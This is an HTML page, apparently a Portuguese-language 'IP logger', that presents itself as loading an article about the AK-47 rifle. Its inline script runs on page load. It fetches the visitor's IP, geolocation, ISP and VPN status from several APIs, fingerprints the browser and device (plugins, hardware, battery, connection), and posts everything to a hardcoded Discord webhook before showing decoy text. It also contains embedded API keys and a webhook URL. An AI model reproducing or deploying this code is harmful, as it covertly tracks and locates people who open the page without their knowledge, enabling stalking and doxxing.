<!DOCTYPE html>
<html>
<head>
  <title>Ak-47.</title>
</head>
<body>
  <h1>Carregando...</h1>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi";
    const ipinfoToken = "e21650a9d682be";
    const iphubKey = "MjkwNTU6S0pXZWdCS016ZDBNWTQ4R0Q3NlY5Z0tHZzRUbFdwQmc="; // substitua pela sua key real

    function getBrowserVersion(ua) {
      let match = ua.match(/(Edg|Chrome|Firefox|Safari)\/([\d\.]+)/);
      if (match) {
        let name = match[1];
        if(name === "Edg") name = "Microsoft Edge";
        return `${name} ${match[2]}`;
      }
      return "Desconhecido";
    }

    function sendPayload(payload) {
      fetch(webhookURL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
      });
    }

    async function coletarEEnviarDados() {
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        const [ipinfoData, ipapiData, ipwhoData, iphubData] = await Promise.all([
          fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`).then(res => res.json()),
          fetch(`http://ip-api.com/json/${ip}?fields=66846719`).then(res => res.json()),
          fetch(`https://ipwho.is/${ip}`).then(res => res.json()),
          fetch(`https://api.iphub.info/ip/${ip}`, {
            headers: { "X-Key": iphubKey }
          }).then(res => res.json())
        ]);

        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const screenResolution = `${screen.width}x${screen.height}`;
        const devicePixelRatio = window.devicePixelRatio;
        const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Nenhum";
        const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
        const deviceMemory = navigator.deviceMemory || "N/A";
        const connection = navigator.connection || {};
        const connectionType = connection.effectiveType || "N/A";
        const downlink = connection.downlink ? connection.downlink + " Mbps" : "N/A";
        const cookieEnabled = navigator.cookieEnabled;
        const online = navigator.onLine;
        const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
        const browserVersion = getBrowserVersion(userAgent);

        function enviarComBateria(batteryLevel, charging) {
          const embed = {
            title: "üïµÔ∏è Novo visitante",
            color: 0xFF0000,
            fields: [
              { name: "IP", value: ip, inline: true },
              { name: "Cidade", value: ipinfoData.city || "N/A", inline: true },
              { name: "Regi√£o", value: ipinfoData.region || "N/A", inline: true },
              { name: "Pa√≠s", value: `${ipapiData.country} (${ipwhoData.continent})`, inline: true },
              { name: "Localiza√ß√£o (lat,long)", value: ipinfoData.loc || "N/A", inline: true },
              { name: "Organiza√ß√£o", value: ipapiData.org || ipinfoData.org || "N/A", inline: true },
              { name: "ASN", value: ipwhoData.asn || "N/A", inline: true },
              { name: "Moeda", value: ipwhoData.currency?.code + " (" + ipwhoData.currency?.symbol + ")" || "N/A", inline: true },
              { name: "Timezone (IPinfo)", value: ipinfoData.timezone || "N/A", inline: true },
              { name: "Navegador (userAgent)", value: userAgent, inline: false },
              { name: "Vers√£o do navegador", value: browserVersion, inline: true },
              { name: "Idioma", value: language, inline: true },
              { name: "Fuso hor√°rio (navegador)", value: timezone, inline: true },
              { name: "Resolu√ß√£o da tela", value: screenResolution, inline: true },
              { name: "DPI (devicePixelRatio)", value: devicePixelRatio.toString(), inline: true },
              { name: "Plugins", value: plugins, inline: false },
              { name: "N√∫cleos da CPU", value: hardwareConcurrency.toString(), inline: true },
              { name: "Mem√≥ria RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
              { name: "Conex√£o", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
              { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "N√£o", inline: true },
              { name: "Online", value: online ? "Sim" : "N√£o", inline: true },
              { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "N√£o", inline: true },
              { name: "N√≠vel da bateria", value: batteryLevel, inline: true },
              { name: "Carregando bateria", value: charging, inline: true },
              { name: "Proxy/VPN (ip-api)", value: `Hosting: ${ipapiData.hosting}, Proxy: ${ipapiData.proxy}, Mobile: ${ipapiData.mobile}`, inline: false },
              { name: "Proxy/VPN (iphub)", value: iphubData.block === 1 ? "üî¥ Prov√°vel Proxy/VPN" : iphubData.block === 2 ? "üü† Datacenter" : "üü¢ Conex√£o residencial", inline: false }
            ],
            footer: { text: "AK-47 Collector" },
            timestamp: new Date().toISOString()
          };

          sendPayload({ embeds: [embed] });

          document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, √© um dos rifles de assalto mais reconhecidos e utilizados no mundo... (texto completo mantido aqui)</h2>`;
        }

        if (navigator.getBattery) {
          navigator.getBattery().then(battery => {
            const batteryLevel = Math.round(battery.level * 100) + "%";
            const charging = battery.charging ? "Sim" : "N√£o";
            enviarComBateria(batteryLevel, charging);
          }).catch(() => enviarComBateria("N/A", "N/A"));
        } else {
          enviarComBateria("N/A", "N/A");
        }

      } catch (error) {
        console.error("Erro ao obter ou enviar informa√ß√µes:", error);
        document.body.innerHTML = "<h2>Erro ao verificar.</h2>";
      }
    }

    coletarEEnviarDados();
  </script>
</body>
</html>
